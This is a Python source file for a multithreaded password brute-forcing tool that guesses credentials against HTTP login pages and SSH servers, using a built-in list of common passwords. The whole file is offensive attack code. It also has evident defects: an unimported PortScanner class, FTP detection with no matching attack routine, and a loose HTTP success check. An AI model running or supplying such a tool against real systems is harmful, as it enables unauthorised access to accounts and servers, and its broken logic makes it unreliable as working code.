import requests
import paramiko
from queue import Queue
from threading import Thread
from utils.logger import setup_logger

logger = setup_logger('brute_forcer')

class BruteForcer:
    def __init__(self, target, username=None, wordlist=None, threads=10):
        self.target = target
        self.username = username
        self.wordlist = wordlist or self.default_wordlist()
        self.threads = threads
        self.queue = Queue()
        self.found = False
        self.protocol = self.detect_protocol()
        
    def detect_protocol(self):
        if self.target.startswith('http'):
            return 'http'
        elif 21 in PortScanner(self.target.split(':')[0], ports=[21]).scan():
            return 'ftp'
        elif 22 in PortScanner(self.target.split(':')[0], ports=[22]).scan():
            return 'ssh'
        else:
            raise ValueError("Could not determine protocol automatically")
    
    def default_wordlist(self):
        # In a real tool, this would load from a file
        return ['admin', 'password', '123456', 'root', 'test']
    
    def http_brute(self, username, password):
        try:
            session = requests.Session()
            # This is a generic example - would need to be adapted for specific sites
            response = session.post(f"{self.target}/login", 
                                  data={'username': username, 'password': password})
            if "login failed" not in response.text.lower():
                logger.success(f"Valid credentials found: {username}:{password}")
                return True
        except Exception as e:
            logger.error(f"HTTP brute error: {e}")
        return False
    
    def ssh_brute(self, username, password):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(self.target.split(':')[0], 
                          port=22 if ':' not in self.target else int(self.target.split(':')[1]),
                          username=username, 
                          password=password,
                          timeout=5)
            logger.success(f"Valid SSH credentials found: {username}:{password}")
            client.close()
            return True
        except:
            return False
    
    def worker(self):
        while not self.queue.empty() and not self.found:
            password = self.queue.get()
            logger.debug(f"Trying: {self.username}:{password}")
            
            if self.protocol == 'http':
                if self.http_brute(self.username, password):
                    self.found = True
            elif self.protocol == 'ssh':
                if self.ssh_brute(self.username, password):
                    self.found = True
            
            self.queue.task_done()
    
    def run(self):
        for password in self.wordlist:
            self.queue.put(password)
        
        for _ in range(self.threads):
            t = Thread(target=self.worker)
            t.daemon = True
            t.start()
        
        self.queue.join()
        
        if not self.found:
            logger.info("Brute force completed. No valid credentials found.")
